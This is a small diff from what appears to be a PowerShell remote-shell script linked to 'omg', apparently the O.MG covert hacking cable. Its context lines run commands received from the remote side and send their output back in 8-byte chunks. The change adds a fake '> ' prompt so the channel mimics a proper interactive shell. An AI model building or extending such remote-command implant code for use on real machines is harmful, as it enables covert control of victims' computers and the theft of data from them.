@@ -151,7 +151,7 @@ namespace omg {
                     Write-Host -ForegroundColor red "[!]Error: Unable to run received command" #Error message in console
                 }
                 #Convert output to bytes
-                $outputBytes = [System.Text.Encoding]::ASCII.GetBytes($output)
+                $outputBytes = [System.Text.Encoding]::ASCII.GetBytes($output + "> ") #Sending fake prompt to mimic a proper shell
                 $outputLength = $outputBytes.Length
                 #Send output bytes to omg
                 $outputChunkSize = 8 # Kept at 8 for best experience
